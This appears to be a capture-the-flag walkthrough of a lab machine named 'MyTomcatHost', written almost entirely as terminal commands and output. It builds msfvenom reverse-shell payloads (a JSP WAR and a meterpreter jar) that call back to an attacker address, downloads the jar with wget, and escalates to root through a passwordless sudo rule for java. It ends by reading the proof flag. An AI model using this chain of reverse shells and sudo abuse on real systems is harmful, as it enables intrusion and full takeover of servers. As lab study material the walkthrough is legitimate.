@@ -1,0 +1,224 @@
+Upload exploit.war
+root@ap:~/CTF/MyTomcatHost# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.13 LPORT=1234 -f war > exploit.war
+
+
+
+
+root@ap:~# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.13] from (UNKNOWN) [192.168.1.203] 43486
+id
+uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+python -c "import pty;pty.spawn('/bin/bash')"
+bash-4.2$ 
+
+bash-4.2$ ls
+ls
+bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
+boot  etc  lib	 media	opt  root  sbin  sys  usr
+bash-4.2$ 
+
+bash-4.2$ 
+
+bash-4.2$ cd home
+cd home
+bash-4.2$ ls
+ls
+bash-4.2$ ls -la
+ls -la
+total 4
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+dr-xr-xr-x. 17 root root 4096 Feb 21 09:36 ..
+bash-4.2$ cd ..
+cd ..
+bash-4.2$ ls
+ls
+bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
+boot  etc  lib	 media	opt  root  sbin  sys  usr
+bash-4.2$ cd root
+cd root
+bash: cd: root: Permission denied
+bash-4.2$ find /etc/ -writable -type f 2>/dev/null
+find /etc/ -writable -type f 2>/dev/null
+bash-4.2$ find / -perm u=s -type f 2>/dev/null
+find / -perm u=s -type f 2>/dev/null
+bash-4.2$ 
+
+bash-4.2$ 
+
+bash-4.2$ 
+
+bash-4.2$ uname -a
+uname -a
+Linux my_tomcat 3.10.0-1062.18.1.el7.x86_64 #1 SMP Tue Mar 17 23:49:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+bash-4.2$ Os-release -a
+Os-release -a
+bash: Os-release: command not found
+bash-4.2$ Osrelease -a
+Osrelease -a
+bash: Osrelease: command not found
+bash-4.2$ lsb_release -a
+lsb_release -a
+bash: lsb_release: command not found
+bash-4.2$ cat /etc/os-release
+cat /etc/os-release
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
+ID_LIKE="rhel fedora"
+VERSION_ID="7"
+PRETTY_NAME="CentOS Linux 7 (Core)"
+ANSI_COLOR="0;31"
+CPE_NAME="cpe:/o:centos:centos:7"
+HOME_URL="https://www.centos.org/"
+BUG_REPORT_URL="https://bugs.centos.org/"
+
+CENTOS_MANTISBT_PROJECT="CentOS-7"
+CENTOS_MANTISBT_PROJECT_VERSION="7"
+REDHAT_SUPPORT_PRODUCT="centos"
+REDHAT_SUPPORT_PRODUCT_VERSION="7"
+
+bash-4.2$ sudo -l
+sudo -l
+Matching Defaults entries for tomcat on this host:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User tomcat may run the following commands on this host:
+    (ALL) NOPASSWD:
+    /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java
+
+
+
+Create reverse shell for java:
+root@ap:~# msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=2002 > shell.jar
+
+
+
+bash-4.2$ wget 192.168.1.13:8888/shell.jar
+wget 192.168.1.13:8888/shell.jar
+--2020-05-16 05:36:19--  http://192.168.1.13:8888/shell.jar
+Connecting to 192.168.1.13:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5309 (5.2K) [application/java-archive]
+Saving to: ‘shell.jar’
+
+100%[======================================>] 5,309       --.-K/s   in 0.007s  
+
+2020-05-16 05:36:19 (744 KB/s) - ‘shell.jar’ saved [5309/5309]
+
+bash-4.2$ ls -la
+ls -la
+total 16
+drwxrwxrwt.  8 root   root   4096 May 16 05:36 .
+dr-xr-xr-x. 17 root   root   4096 Feb 21 09:36 ..
+drwxrwxrwt.  2 root   root      6 Feb 21 07:07 .font-unix
+drwxr-x---   2 tomcat tomcat   16 May 16 05:14 hsperfdata_tomcat
+drwxrwxrwt.  2 root   root      6 Feb 21 07:07 .ICE-unix
+-rw-r-----   1 tomcat tomcat 5309 May 16 05:35 shell.jar
+drwxrwxrwt.  2 root   root      6 Feb 21 07:07 .Test-unix
+drwxrwxrwt.  2 root   root      6 Feb 21 07:07 .X11-unix
+drwxrwxrwt.  2 root   root      6 Feb 21 07:07 .XIM-unix
+bash-4.2$ chmod +x shell.jar
+chmod +x shell.jar
+bash-4.2$ 
+
+bash-4.2$ 
+
+bash-4.2$ sudo java -jar shell.jar
+sudo java -jar shell.jar
+bash-4.2$ 
+
+
+Start listener on local host:
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.1.13:2002 
+[*] Sending stage (53906 bytes) to 192.168.1.203
+[*] Meterpreter session 1 opened (192.168.1.13:2002 -> 192.168.1.203:60292) at 2020-05-16 11:39:32 +0200
+
+meterpreter > getuid
+Server username: root
+meterpreter > 
+meterpreter > ls
+Listing: /tmp
+=============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   6     dir   2020-02-21 13:07:16 +0100  .ICE-unix
+40777/rwxrwxrwx   6     dir   2020-02-21 13:07:16 +0100  .Test-unix
+40777/rwxrwxrwx   6     dir   2020-02-21 13:07:16 +0100  .X11-unix
+40777/rwxrwxrwx   6     dir   2020-02-21 13:07:16 +0100  .XIM-unix
+40777/rwxrwxrwx   6     dir   2020-02-21 13:07:16 +0100  .font-unix
+40776/rwxrwxrw-   17    dir   2020-05-16 11:39:32 +0200  hsperfdata_root
+40776/rwxrwxrw-   16    dir   2020-05-16 11:14:15 +0200  hsperfdata_tomcat
+100776/rwxrwxrw-  5309  fil   2020-05-16 11:35:44 +0200  shell.jar
+
+meterpreter > cd /root
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100667/rw-rw-rwx  454   fil   2020-03-22 12:44:04 +0100  .bash_history
+100667/rw-rw-rwx  18    fil   2013-12-29 03:26:31 +0100  .bash_logout
+100667/rw-rw-rwx  176   fil   2013-12-29 03:26:31 +0100  .bash_profile
+100667/rw-rw-rwx  216   fil   2020-03-22 07:39:02 +0100  .bashrc
+100667/rw-rw-rwx  100   fil   2013-12-29 03:26:31 +0100  .cshrc
+40777/rwxrwxrwx   18    dir   2020-02-21 15:26:22 +0100  .pki
+100667/rw-rw-rwx  129   fil   2013-12-29 03:26:31 +0100  .tcshrc
+100666/rw-rw-rw-  46    fil   2020-03-22 10:56:43 +0100  proof.txt
+
+meterpreter > download proof.txt
+[*] Downloading: proof.txt -> proof.txt
+[*] Downloaded 0.00 B of 46.00 B (0.0%): proof.txt -> proof.txt
+[*] Downloaded 0.00 B of 46.00 B (0.0%): proof.txt -> proof.txt
+[*] Downloaded 46.00 B of 46.00 B (100.0%): proof.txt -> proof.txt
+[*] download   : proof.txt -> proof.txt
+meterpreter > cat proof.txt
+Best of Luck
+628435356e49f976bab2c04948d22fe4
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100667/rw-rw-rwx  454   fil   2020-03-22 12:44:04 +0100  .bash_history
+100667/rw-rw-rwx  18    fil   2013-12-29 03:26:31 +0100  .bash_logout
+100667/rw-rw-rwx  176   fil   2013-12-29 03:26:31 +0100  .bash_profile
+100667/rw-rw-rwx  216   fil   2020-03-22 07:39:02 +0100  .bashrc
+100667/rw-rw-rwx  100   fil   2013-12-29 03:26:31 +0100  .cshrc
+40777/rwxrwxrwx   18    dir   2020-02-21 15:26:22 +0100  .pki
+100667/rw-rw-rwx  129   fil   2013-12-29 03:26:31 +0100  .tcshrc
+100666/rw-rw-rw-  46    fil   2020-03-22 10:56:43 +0100  proof.txt
+
+
+
